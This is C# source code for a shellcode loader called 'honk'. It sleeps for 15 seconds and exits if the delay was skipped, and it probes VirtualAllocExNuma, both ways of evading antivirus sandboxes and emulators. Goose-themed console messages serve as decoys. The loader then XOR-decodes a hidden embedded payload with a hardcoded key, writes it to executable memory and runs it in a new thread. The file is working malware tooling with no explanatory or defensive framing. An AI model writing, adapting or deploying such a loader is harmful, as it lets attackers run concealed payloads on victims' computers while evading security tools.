using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace honk
{
    class honk
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType,
        UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            appleBits();

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            try
            {
                byte[] encodedShellcode;
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = "honk.user.dat"; // Ensure this matches the embedded resource name

                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                    {
                        Console.WriteLine("Failed to load embedded resource.");
                        return;
                    }
                    using (BinaryReader reader = new BinaryReader(stream))
                    {
                        encodedShellcode = reader.ReadBytes((int)stream.Length);
                    }
                }

                // Define the XOR key
                string strKey = "1LNVYM6@0J6wPtvNvWLXMszImNWg0c";
                byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(strKey);

                // Decode the shellcode with XOR
                byte[] shellcode = new byte[encodedShellcode.Length];
                for (int i = 0; i < encodedShellcode.Length; i++)
                {
                    shellcode[i] = (byte)(encodedShellcode[i] ^ keyBytes[i % keyBytes.Length]);
                }
                byte[] cattle = shellcode;                
                int size = cattle.Length;

                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)cattle.Length, 0x3000, 0x40);
                Marshal.Copy(cattle, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        public static void appleBits()
        {
            Console.WriteLine("Here you will learn about gooses!");
            Console.WriteLine("In the digital ponds of cyberspace, the legendary hacker goose is known for its unique ability to \"quack\" through any security system, leaving a trail of digital feathers but never getting caught.");
            holdYourHorses();
        }

        static void holdYourHorses()
        {
            DateTime startTime = DateTime.Now;
            Console.WriteLine("Gooses get tiredz...");

            Sleep(15000);

            DateTime endTime = DateTime.Now;
            TimeSpan duration = endTime - startTime;

            Console.WriteLine($"Gooses woked up after {duration.TotalSeconds} seconds.");

            // Adjust this threshold based on expected variances in timing and execution environments
            if (duration.TotalSeconds < 15)
            {
                Console.WriteLine("Man this beach is so darn sandy :(");
                Environment.Exit(-1);
            }
            else
            {
                Console.WriteLine("Mess with the Honk get the Bonk!");
            }
        }
    }
}
